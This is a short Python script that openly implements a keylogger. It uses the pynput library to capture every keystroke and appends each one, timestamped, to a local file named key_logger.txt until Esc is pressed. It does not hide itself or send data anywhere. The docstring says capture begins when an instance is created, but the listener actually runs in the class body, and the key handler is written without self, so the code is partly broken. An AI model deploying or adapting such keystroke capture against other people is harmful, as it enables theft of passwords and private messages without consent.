import time
import sys
from pynput.keyboard import Listener, KeyCode, Key
import logging
import os
#importing all libraries


print(f"Current: {os.getcwd()}")


class Keylogger:
    """ 
    This program implements a basic keylogger function that captures and logs keystrokes along with the timestamp of the action.

    This class implements a basic keylogger function that captures and logs keystrokes along with the timestamp of the action.
    
    Usage:
        k1 = Keylogger() # creates a new Keylogger instance that starts capturing keystrokes
        
    Attributes:
        None
    
    Methods:
        on_key_press: This method is called when a key is pressed. It logs the key and its timestamp.
        
    Example:
        k1 = Keylogger() # creates a new Keylogger instance that starts capturing keystrokes

    """

    def on_key_press(key):
        try:
            log_dir = os.path.join(os.getcwd(), "key_logger.txt")

            print(f"The Key: {key}")
            FORMAT = "%(asctime)s %(message)s"
            logger = logging.basicConfig(
                filename=log_dir, level=logging.INFO, format=FORMAT)
            #making a condition if user want to stop the keylogger
            if key == Key.esc:
                print("Stopped")
                sys.exit()

            time.sleep(0.001)
            logging.info(key)

        except IOError:
            print("Error: Could not open or write to file.")
            sys.exit()

    try:
        with Listener(on_press=on_key_press) as listener:
            listener.join()

    except RuntimeError:
        print("Run Time Error")

    finally:
        print("Keylogger stopped.")


if __name__ == "__main__":
    k1 = Keylogger()
